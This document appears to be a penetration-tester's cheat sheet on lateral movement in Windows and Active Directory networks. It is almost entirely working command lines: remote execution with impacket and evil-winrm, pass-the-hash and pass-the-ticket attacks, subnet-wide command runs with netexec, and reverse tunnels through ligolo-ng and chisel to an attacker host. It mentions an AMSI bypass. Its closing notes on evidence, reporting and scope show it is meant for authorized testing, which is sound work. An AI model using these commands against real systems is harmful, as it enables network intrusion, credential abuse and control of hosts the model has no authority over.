# 08 — Lateral Movement & Pivoting

**Goal:** move from the host/account you own to your next target, reusing credentials/tickets, and
tunnel your tools deeper into the network.

## Remote execution methods (pick by what's open + OPSEC)
```bash
# SMB-based exec (needs local admin on target)
impacket-psexec  <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>     # loud (creates a service)
impacket-smbexec <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>     # semi-interactive, quieter
impacket-wmiexec <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>     # WMI, no service, good default
# WinRM (5985/5986) — evil-winrm: most common interactive Windows shell
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASS>'
evil-winrm -i <TARGET_IP> -u '<USER>' -H '<NTHASH>'                 # pass-the-hash
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASS>' -S               # SSL (5986)
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASS>' \
  -s /opt/scripts/ -e /opt/bins/                                   # script/exe load dirs
#   in-session: upload <local> <remote> | download <remote> <local> | menu | Bypass-4MSI
#   load a .ps1 placed in -s dir, then call its functions (e.g. PowerView, PowerUp)
# WinRM as SYSTEM/other via runas-style creds is not supported — use a fresh evil-winrm per identity
# netexec to run a command everywhere you're admin
nxc smb   <SUBNET> -u '<USER>' -p '<PASS>' -x 'whoami' --continue-on-success   # cmd
nxc smb   <SUBNET> -u '<USER>' -p '<PASS>' -X '$PSVersionTable' --continue-on-success  # powershell
nxc winrm <SUBNET> -u '<USER>' -p '<PASS>' -x 'whoami' --continue-on-success   # over WinRM
```

## Pass-the-Hash / Pass-the-Ticket / OverPass-the-Hash
```bash
# PtH (NT hash instead of password) — works across most impacket/nxc/evil-winrm tools
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTHASH>
nxc smb <TARGET_IP> -u '<USER>' -H '<NTHASH>'
evil-winrm -i <TARGET_IP> -u '<USER>' -H '<NTHASH>'
# Get a TGT from a hash / AES key, then use the ticket
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTHASH>          # -> <USER>.ccache
export KRB5CCNAME=<USER>.ccache
impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>
# From Windows (Rubeus): request/pass a ticket
Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /ptt
```
> Kerberos needs the **FQDN/hostname**, not the IP. Fix time skew (`ntpdate <DC_IP>`) or Kerberos fails.

## Pivoting / tunneling
```bash
# ligolo-ng (clean L3 tunnel — preferred)
#   attacker: ./proxy -selfcert   ; add route to the internal subnet via the ligolo interface
#   target:   ./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# chisel SOCKS
./chisel server -p 8080 --reverse                         # attacker
./chisel client <ATTACKER_IP>:8080 R:socks                # target
# Then push tools through the tunnel
proxychains nxc smb <INTERNAL_SUBNET> -u '<USER>' -p '<PASS>'
```

## Evidence to capture
- Each hop: source host/account → method → destination host, with timestamps (builds the attack path).
- The privilege proven on each new host (`whoami /all`).

## Pitfalls
- psexec is the loudest option — prefer wmiexec/WinRM when you can.
- Track every host you touch for the report and for clean teardown.
- Don't relay/reuse creds to out-of-scope segments even if routing allows it.
